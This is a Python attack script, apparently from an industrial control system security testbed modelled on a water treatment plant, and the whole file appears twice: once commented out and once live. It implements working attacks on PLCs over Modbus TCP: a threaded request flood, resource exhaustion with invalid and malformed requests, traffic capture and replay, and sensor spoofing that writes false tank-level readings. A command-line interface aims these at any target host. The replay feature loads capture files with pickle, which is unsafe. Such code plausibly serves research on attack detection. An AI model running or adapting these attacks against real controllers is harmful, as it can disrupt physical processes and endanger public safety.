# #!/usr/bin/env python3
# """
# Denial of Service and Replay Attacks
# MITRE ATT&CK ICS: T0806 - Brute Force I/O, T0843 - Program Download
# """

# import sys
# import time
# import pickle
# import argparse
# from pathlib import Path
# from collections import deque
# from threading import Thread

# sys.path.append(str(Path(__file__).parent.parent))

# from attacks.attack_base import BaseAttack, AttackOrchestrator
# from config.swat_config import ATTACK_SCENARIOS
# import logging

# logger = logging.getLogger(__name__)


# class DoSFloodAttack(BaseAttack):
#     """
#     Flood PLC with rapid Modbus requests.
#     """
    
#     def __init__(self, modbus_client, attack_config):
#         super().__init__(modbus_client, attack_config)
#         self.request_count = 0
#         self.error_count = 0
    
#     def flood_worker(self):
#         """Worker thread for flooding."""
#         target_function = self.parameters.get('target_function', 3)
        
#         while self.running and not self.check_timeout():
#             try:
#                 if target_function == 3:
#                     # Read holding registers
#                     self.modbus.read_holding_registers(0, count=10)
#                 elif target_function == 1:
#                     # Read coils
#                     self.modbus.read_coils(0, count=10)
#                 else:
#                     # Default to read registers
#                     self.modbus.read_holding_registers(0, count=10)
                
#                 self.request_count += 1
                
#             except Exception as e:
#                 self.error_count += 1
    
#     def execute(self):
#         """Execute DoS flood attack."""
#         requests_per_second = self.parameters.get('requests_per_second', 1000)
#         num_threads = min(requests_per_second // 100, 10)  # Cap at 10 threads
        
#         logger.info(f"Starting DoS flood: {requests_per_second} req/s using {num_threads} threads")
        
#         # Start flood threads
#         threads = []
#         for i in range(num_threads):
#             t = Thread(target=self.flood_worker)
#             t.daemon = True
#             t.start()
#             threads.append(t)
        
#         # Monitor attack
#         start = time.time()
#         last_count = 0
        
#         while (time.time() - start) < self.duration:
#             time.sleep(1.0)
            
#             # Calculate current rate
#             current_rate = self.request_count - last_count
#             last_count = self.request_count
            
#             logger.info(f"DoS Rate: {current_rate} req/s | Total: {self.request_count} | Errors: {self.error_count}")
            
#             self.log_action('dos_flood_status', {
#                 'requests_total': self.request_count,
#                 'requests_per_second': current_rate,
#                 'errors': self.error_count
#             })
        
#         # Stop threads
#         self.running = False
#         for t in threads:
#             t.join(timeout=1.0)
        
#         logger.info(f"DoS attack completed: {self.request_count} total requests, {self.error_count} errors")


# class DoSResourceExhaustion(BaseAttack):
#     """
#     Exhaust PLC resources through malformed packets.
#     """
    
#     def execute(self):
#         """Execute resource exhaustion attack."""
#         invalid_functions = self.parameters.get('invalid_function_codes', True)
#         oversized_packets = self.parameters.get('oversized_packets', True)
        
#         logger.info("Starting resource exhaustion attack")
        
#         start = time.time()
#         request_count = 0
        
#         while (time.time() - start) < self.duration:
#             try:
#                 if invalid_functions:
#                     # Try invalid function codes
#                     for invalid_code in [99, 128, 255]:
#                         try:
#                             # This will likely cause an error on the PLC
#                             self.modbus.client.execute(invalid_code, 0)
#                             request_count += 1
#                         except:
#                             pass
                
#                 if oversized_packets:
#                     # Try reading excessive number of registers
#                     try:
#                         self.modbus.read_holding_registers(0, count=125)  # Max allowed is usually 125
#                         request_count += 1
#                     except:
#                         pass
                
#                 # Malformed requests (zero-length reads)
#                 try:
#                     self.modbus.read_holding_registers(0, count=0)
#                     request_count += 1
#                 except:
#                     pass
                
#                 time.sleep(0.01)  # Small delay to avoid crashing our own system
                
#             except Exception as e:
#                 logger.debug(f"Error in resource exhaustion: {e}")
            
#             if request_count % 100 == 0:
#                 self.log_action('resource_exhaustion_progress', {
#                     'requests': request_count
#                 })
        
#         logger.info(f"Resource exhaustion completed: {request_count} malformed requests sent")


# class ReplayAttack(BaseAttack):
#     """
#     Capture and replay legitimate Modbus traffic.
#     """
    
#     def __init__(self, modbus_client, attack_config):
#         super().__init__(modbus_client, attack_config)
#         self.captured_traffic = []
    
#     def capture_traffic(self, duration: float):
#         """
#         Capture Modbus traffic.
        
#         Args:
#             duration: Capture duration in seconds
#         """
#         logger.info(f"Capturing traffic for {duration} seconds...")
        
#         start = time.time()
#         while (time.time() - start) < duration:
#             try:
#                 # Capture register reads
#                 for addr in range(0, 50, 10):
#                     result = self.modbus.read_holding_registers(addr, count=10)
#                     if result:
#                         self.captured_traffic.append({
#                             'timestamp': time.time(),
#                             'type': 'register_read',
#                             'address': addr,
#                             'count': 10,
#                             'values': result
#                         })
                
#                 # Capture coil reads
#                 for addr in range(0, 30, 10):
#                     result = self.modbus.read_coils(addr, count=10)
#                     if result:
#                         self.captured_traffic.append({
#                             'timestamp': time.time(),
#                             'type': 'coil_read',
#                             'address': addr,
#                             'count': 10,
#                             'values': result
#                         })
                
#                 time.sleep(1.0)
                
#             except Exception as e:
#                 logger.debug(f"Capture error: {e}")
        
#         logger.info(f"Captured {len(self.captured_traffic)} traffic samples")
#         self.log_action('traffic_captured', {
#             'samples': len(self.captured_traffic),
#             'duration': duration
#         })
    
#     def replay_traffic(self, count: int, delay: float):
#         """
#         Replay captured traffic.
        
#         Args:
#             count: Number of times to replay
#             delay: Delay between replays
#         """
#         logger.info(f"Replaying traffic {count} times with {delay}s delay...")
        
#         for replay_num in range(count):
#             for packet in self.captured_traffic:
#                 try:
#                     if packet['type'] == 'register_read':
#                         # Read (for monitoring) - actual attack would write these values
#                         self.modbus.read_holding_registers(
#                             packet['address'],
#                             count=packet['count']
#                         )
#                     elif packet['type'] == 'coil_read':
#                         self.modbus.read_coils(
#                             packet['address'],
#                             count=packet['count']
#                         )
                    
#                 except Exception as e:
#                     logger.debug(f"Replay error: {e}")
            
#             self.log_action('traffic_replayed', {
#                 'replay_number': replay_num + 1,
#                 'packets': len(self.captured_traffic)
#             })
            
#             time.sleep(delay)
            
#             if self.check_timeout():
#                 break
        
#         logger.info(f"Replay completed: {count} iterations")
    
#     def save_capture(self, filepath: str):
#         """
#         Save captured traffic to file.
        
#         Args:
#             filepath: Output file path
#         """
#         with open(filepath, 'wb') as f:
#             pickle.dump(self.captured_traffic, f)
#         logger.info(f"Captured traffic saved to {filepath}")
    
#     def load_capture(self, filepath: str):
#         """
#         Load captured traffic from file.
        
#         Args:
#             filepath: Input file path
#         """
#         with open(filepath, 'rb') as f:
#             self.captured_traffic = pickle.load(f)
#         logger.info(f"Loaded {len(self.captured_traffic)} traffic samples from {filepath}")
    
#     def execute(self):
#         """Execute replay attack."""
#         capture_duration = self.parameters.get('capture_duration', 30)
#         replay_count = self.parameters.get('replay_count', 10)
#         replay_delay = self.parameters.get('replay_delay', 1.0)
        
#         # Capture phase
#         self.capture_traffic(capture_duration)
        
#         # Replay phase
#         if not self.check_timeout():
#             self.replay_traffic(replay_count, replay_delay)


# class MITMSensorSpoofing(BaseAttack):
#     """
#     Man-in-the-middle sensor spoofing attack.
#     """
    
#     def execute(self):
#         """Execute MITM sensor spoofing."""
#         target_sensors = self.parameters.get('target_sensors', ['LIT_101', 'LIT_301', 'LIT_401'])
#         offset = self.parameters.get('offset', 100)
        
#         logger.info(f"Spoofing {len(target_sensors)} sensors with offset {offset}")
        
#         from config.swat_config import HOLDING_REGISTERS
        
#         # Map sensor names to addresses
#         sensor_addresses = {}
#         for sensor_name in target_sensors:
#             if sensor_name in HOLDING_REGISTERS:
#                 sensor_addresses[sensor_name] = HOLDING_REGISTERS[sensor_name]['address']
        
#         start = time.time()
#         while (time.time() - start) < self.duration:
#             for sensor_name, address in sensor_addresses.items():
#                 try:
#                     # Read actual value
#                     actual = self.read_register(address)
                    
#                     if actual is not None:
#                         # Spoof by adding offset
#                         spoofed = actual + offset
                        
#                         # Ensure within valid range
#                         spoofed = max(0, min(spoofed, 1000))
                        
#                         # Write spoofed value
#                         self.write_register(address, spoofed)
                        
#                         self.log_action('sensor_spoofed', {
#                             'sensor': sensor_name,
#                             'address': address,
#                             'actual': actual,
#                             'spoofed': spoofed,
#                             'offset': offset
#                         })
                
#                 except Exception as e:
#                     logger.debug(f"Spoofing error for {sensor_name}: {e}")
            
#             time.sleep(1.0)


# def main():
#     """Main entry point."""
#     parser = argparse.ArgumentParser(description='SWAT DOS and Replay Attacks')
#     parser.add_argument('--host', required=True, help='Target PLC IP address')
#     parser.add_argument('--port', type=int, default=502, help='Modbus TCP port')
#     parser.add_argument('--attack', required=True,
#                        choices=['dos_flood', 'dos_resource', 'replay', 'mitm_spoof'],
#                        help='Attack type to execute')
#     parser.add_argument('--duration', type=int, default=60, help='Attack duration (seconds)')
    
#     # DOS flood arguments
#     parser.add_argument('--rate', type=int, default=1000,
#                        help='Requests per second (for dos_flood)')
    
#     # Replay arguments
#     parser.add_argument('--capture-time', type=int, default=30,
#                        help='Capture duration (for replay)')
#     parser.add_argument('--replay-count', type=int, default=10,
#                        help='Number of replays (for replay)')
#     parser.add_argument('--capture-file', help='File to save/load capture (for replay)')
    
#     # MITM arguments
#     parser.add_argument('--offset', type=int, default=100,
#                        help='Sensor spoofing offset (for mitm_spoof)')
    
#     args = parser.parse_args()
    
#     # Setup orchestrator
#     modbus_config = {
#         'host': args.host,
#         'port': args.port,
#         'timeout': 3,
#         'retries': 3,
#         'unit_id': 1
#     }
    
#     orchestrator = AttackOrchestrator(modbus_config)
    
#     if not orchestrator.connect():
#         logger.error("Failed to connect to target")
#         return 1
    
#     try:
#         # Select and configure attack
#         if args.attack == 'dos_flood':
#             config = ATTACK_SCENARIOS['dos_flood'].copy()
#             config['duration'] = args.duration
#             config['parameters']['requests_per_second'] = args.rate
#             attack = DoSFloodAttack(orchestrator.modbus, config)
            
#         elif args.attack == 'dos_resource':
#             config = ATTACK_SCENARIOS['dos_resource_exhaustion'].copy()
#             config['duration'] = args.duration
#             attack = DoSResourceExhaustion(orchestrator.modbus, config)
            
#         elif args.attack == 'replay':
#             config = ATTACK_SCENARIOS['replay_attack'].copy()
#             config['duration'] = args.duration
#             config['parameters']['capture_duration'] = args.capture_time
#             config['parameters']['replay_count'] = args.replay_count
#             attack = ReplayAttack(orchestrator.modbus, config)
            
#             # Load existing capture if specified
#             if args.capture_file and Path(args.capture_file).exists():
#                 attack.load_capture(args.capture_file)
            
#         elif args.attack == 'mitm_spoof':
#             config = ATTACK_SCENARIOS['mitm_sensor_spoofing'].copy()
#             config['duration'] = args.duration
#             config['parameters']['offset'] = args.offset
#             attack = MITMSensorSpoofing(orchestrator.modbus, config)
        
#         else:
#             logger.error(f"Unknown attack type: {args.attack}")
#             return 1
        
#         # Execute attack
#         attack.run()
        
#         # Save replay capture if specified
#         if args.attack == 'replay' and args.capture_file:
#             attack.save_capture(args.capture_file)
        
#     finally:
#         orchestrator.disconnect()
    
#     return 0


# if __name__ == '__main__':
#     sys.exit(main())

#!/usr/bin/env python3
"""
Denial of Service and Replay Attacks
MITRE ATT&CK ICS: T0806 - Brute Force I/O, T0843 - Program Download
"""

import sys
import time
import pickle
import argparse
from pathlib import Path
from collections import deque
from threading import Thread

sys.path.append(str(Path(__file__).parent.parent))

from attacks.attack_base import BaseAttack, AttackOrchestrator
from config.swat_config import ATTACK_SCENARIOS
import logging

logger = logging.getLogger(__name__)


class DoSFloodAttack(BaseAttack):
    """
    Flood PLC with rapid Modbus requests.
    """
    
    def __init__(self, modbus_client, attack_config):
        super().__init__(modbus_client, attack_config)
        self.request_count = 0
        self.error_count = 0
    
    def flood_worker(self):
        """Worker thread for flooding."""
        target_function = self.parameters.get('target_function', 3)
        
        while self.running and not self.check_timeout():
            try:
                if target_function == 3:
                    # Read holding registers
                    self.modbus.read_holding_registers(0, count=10)
                elif target_function == 1:
                    # Read coils
                    self.modbus.read_coils(0, count=10)
                else:
                    # Default to read registers
                    self.modbus.read_holding_registers(0, count=10)
                
                self.request_count += 1
                
            except Exception as e:
                self.error_count += 1
    
    def execute(self):
        """Execute DoS flood attack."""
        requests_per_second = self.parameters.get('requests_per_second', 100)
        num_threads = min(requests_per_second // 100, 5)  # Cap at 5 threads
        
        logger.info(f"Starting DoS flood: {requests_per_second} req/s using {num_threads} threads")
        
        # Start flood threads
        threads = []
        for i in range(num_threads):
            t = Thread(target=self.flood_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor attack
        start = time.time()
        last_count = 0
        
        while (time.time() - start) < self.duration:
            time.sleep(1.0)
            
            # Calculate current rate
            current_rate = self.request_count - last_count
            last_count = self.request_count
            
            logger.info(f"DoS Rate: {current_rate} req/s | Total: {self.request_count} | Errors: {self.error_count}")
            
            self.log_action('dos_flood_status', {
                'requests_total': self.request_count,
                'requests_per_second': current_rate,
                'errors': self.error_count
            })
        
        # Stop threads
        self.running = False
        for t in threads:
            t.join(timeout=1.0)
        
        logger.info(f"DoS attack completed: {self.request_count} total requests, {self.error_count} errors")


class DoSResourceExhaustion(BaseAttack):
    """
    Exhaust PLC resources through malformed packets.
    """
    
    def execute(self):
        """Execute resource exhaustion attack."""
        invalid_functions = self.parameters.get('invalid_function_codes', True)
        oversized_packets = self.parameters.get('oversized_packets', True)
        
        logger.info("Starting resource exhaustion attack")
        
        start = time.time()
        request_count = 0
        
        while (time.time() - start) < self.duration:
            try:
                if invalid_functions:
                    # Try invalid function codes
                    for invalid_code in [99, 128, 255]:
                        try:
                            # This will likely cause an error on the PLC
                            self.modbus.client.execute(invalid_code, 0)
                            request_count += 1
                        except:
                            pass
                
                if oversized_packets:
                    # Try reading excessive number of registers
                    try:
                        self.modbus.read_holding_registers(0, count=125)  # Max allowed is usually 125
                        request_count += 1
                    except:
                        pass
                
                # Malformed requests (zero-length reads)
                try:
                    self.modbus.read_holding_registers(0, count=0)
                    request_count += 1
                except:
                    pass
                
                time.sleep(0.01)  # Small delay to avoid crashing our own system
                
            except Exception as e:
                logger.debug(f"Error in resource exhaustion: {e}")
            
            if request_count % 100 == 0:
                self.log_action('resource_exhaustion_progress', {
                    'requests': request_count
                })
        
        logger.info(f"Resource exhaustion completed: {request_count} malformed requests sent")


class ReplayAttack(BaseAttack):
    """
    Capture and replay legitimate Modbus traffic.
    """
    
    def __init__(self, modbus_client, attack_config):
        super().__init__(modbus_client, attack_config)
        self.captured_traffic = []
    
    def capture_traffic(self, duration: float):
        """
        Capture Modbus traffic.
        
        Args:
            duration: Capture duration in seconds
        """
        logger.info(f"Capturing traffic for {duration} seconds...")
        
        start = time.time()
        while (time.time() - start) < duration:
            try:
                # Capture register reads
                for addr in range(0, 50, 10):
                    result = self.modbus.read_holding_registers(addr, count=10)
                    if result:
                        self.captured_traffic.append({
                            'timestamp': time.time(),
                            'type': 'register_read',
                            'address': addr,
                            'count': 10,
                            'values': result
                        })
                
                # Capture coil reads
                for addr in range(0, 30, 10):
                    result = self.modbus.read_coils(addr, count=10)
                    if result:
                        self.captured_traffic.append({
                            'timestamp': time.time(),
                            'type': 'coil_read',
                            'address': addr,
                            'count': 10,
                            'values': result
                        })
                
                time.sleep(1.0)
                
            except Exception as e:
                logger.debug(f"Capture error: {e}")
        
        logger.info(f"Captured {len(self.captured_traffic)} traffic samples")
        self.log_action('traffic_captured', {
            'samples': len(self.captured_traffic),
            'duration': duration
        })
    
    def replay_traffic(self, count: int, delay: float):
        """
        Replay captured traffic.
        
        Args:
            count: Number of times to replay
            delay: Delay between replays
        """
        logger.info(f"Replaying traffic {count} times with {delay}s delay...")
        
        for replay_num in range(count):
            for packet in self.captured_traffic:
                try:
                    if packet['type'] == 'register_read':
                        # Read (for monitoring) - actual attack would write these values
                        self.modbus.read_holding_registers(
                            packet['address'],
                            count=packet['count']
                        )
                    elif packet['type'] == 'coil_read':
                        self.modbus.read_coils(
                            packet['address'],
                            count=packet['count']
                        )
                    
                except Exception as e:
                    logger.debug(f"Replay error: {e}")
            
            self.log_action('traffic_replayed', {
                'replay_number': replay_num + 1,
                'packets': len(self.captured_traffic)
            })
            
            time.sleep(delay)
            
            if self.check_timeout():
                break
        
        logger.info(f"Replay completed: {count} iterations")
    
    def save_capture(self, filepath: str):
        """
        Save captured traffic to file.
        
        Args:
            filepath: Output file path
        """
        with open(filepath, 'wb') as f:
            pickle.dump(self.captured_traffic, f)
        logger.info(f"Captured traffic saved to {filepath}")
    
    def load_capture(self, filepath: str):
        """
        Load captured traffic from file.
        
        Args:
            filepath: Input file path
        """
        with open(filepath, 'rb') as f:
            self.captured_traffic = pickle.load(f)
        logger.info(f"Loaded {len(self.captured_traffic)} traffic samples from {filepath}")
    
    def execute(self):
        """Execute replay attack."""
        capture_duration = self.parameters.get('capture_duration', 30)
        replay_count = self.parameters.get('replay_count', 10)
        replay_delay = self.parameters.get('replay_delay', 1.0)
        
        # Capture phase
        self.capture_traffic(capture_duration)
        
        # Replay phase
        if not self.check_timeout():
            self.replay_traffic(replay_count, replay_delay)


class MITMSensorSpoofing(BaseAttack):
    """
    Man-in-the-middle sensor spoofing attack.
    """
    
    def execute(self):
        """Execute MITM sensor spoofing."""
        target_sensors = self.parameters.get('target_sensors', ['LIT_101', 'LIT_301', 'LIT_401'])
        offset = self.parameters.get('offset', 100)
        
        logger.info(f"Spoofing {len(target_sensors)} sensors with offset {offset}")
        
        from config.swat_config import HOLDING_REGISTERS
        
        # Map sensor names to addresses
        sensor_addresses = {}
        for sensor_name in target_sensors:
            if sensor_name in HOLDING_REGISTERS:
                sensor_addresses[sensor_name] = HOLDING_REGISTERS[sensor_name]['address']
        
        start = time.time()
        while (time.time() - start) < self.duration:
            for sensor_name, address in sensor_addresses.items():
                try:
                    # Read actual value
                    actual = self.read_register(address)
                    
                    if actual is not None:
                        # Spoof by adding offset
                        spoofed = actual + offset
                        
                        # Ensure within valid range
                        spoofed = max(0, min(spoofed, 1000))
                        
                        # Write spoofed value
                        self.write_register(address, spoofed)
                        
                        self.log_action('sensor_spoofed', {
                            'sensor': sensor_name,
                            'address': address,
                            'actual': actual,
                            'spoofed': spoofed,
                            'offset': offset
                        })
                
                except Exception as e:
                    logger.debug(f"Spoofing error for {sensor_name}: {e}")
            
            time.sleep(1.0)


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(description='SWAT DOS and Replay Attacks')
    parser.add_argument('--host', required=True, help='Target PLC IP address')
    parser.add_argument('--port', type=int, default=502, help='Modbus TCP port')
    parser.add_argument('--attack', required=True,
                       choices=['dos_flood', 'dos_resource', 'replay', 'mitm_spoof'],
                       help='Attack type to execute')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration (seconds)')
    
    # DOS flood arguments
    parser.add_argument('--rate', type=int, default=1000,
                       help='Requests per second (for dos_flood)')
    
    # Replay arguments
    parser.add_argument('--capture-time', type=int, default=30,
                       help='Capture duration (for replay)')
    parser.add_argument('--replay-count', type=int, default=10,
                       help='Number of replays (for replay)')
    parser.add_argument('--capture-file', help='File to save/load capture (for replay)')
    
    # MITM arguments
    parser.add_argument('--offset', type=int, default=100,
                       help='Sensor spoofing offset (for mitm_spoof)')
    
    args = parser.parse_args()
    
    # Setup orchestrator
    modbus_config = {
        'host': args.host,
        'port': args.port,
        'timeout': 3,
        'retries': 3,
        'unit_id': 1
    }
    
    orchestrator = AttackOrchestrator(modbus_config)
    
    if not orchestrator.connect():
        logger.error("Failed to connect to target")
        return 1
    
    try:
        # Select and configure attack
        if args.attack == 'dos_flood':
            config = ATTACK_SCENARIOS['dos_flood'].copy()
            config['duration'] = args.duration
            config['parameters']['requests_per_second'] = args.rate
            attack = DoSFloodAttack(orchestrator.modbus, config)
            
        elif args.attack == 'dos_resource':
            config = ATTACK_SCENARIOS['dos_resource_exhaustion'].copy()
            config['duration'] = args.duration
            attack = DoSResourceExhaustion(orchestrator.modbus, config)
            
        elif args.attack == 'replay':
            config = ATTACK_SCENARIOS['replay_attack'].copy()
            config['duration'] = args.duration
            config['parameters']['capture_duration'] = args.capture_time
            config['parameters']['replay_count'] = args.replay_count
            attack = ReplayAttack(orchestrator.modbus, config)
            
            # Load existing capture if specified
            if args.capture_file and Path(args.capture_file).exists():
                attack.load_capture(args.capture_file)
            
        elif args.attack == 'mitm_spoof':
            config = ATTACK_SCENARIOS['mitm_sensor_spoofing'].copy()
            config['duration'] = args.duration
            config['parameters']['offset'] = args.offset
            attack = MITMSensorSpoofing(orchestrator.modbus, config)
        
        else:
            logger.error(f"Unknown attack type: {args.attack}")
            return 1
        
        # Execute attack
        attack.run()
        
        # Save replay capture if specified
        if args.attack == 'replay' and args.capture_file:
            attack.save_capture(args.capture_file)
        
    finally:
        orchestrator.disconnect()
    
    return 0


if __name__ == '__main__':
    sys.exit(main())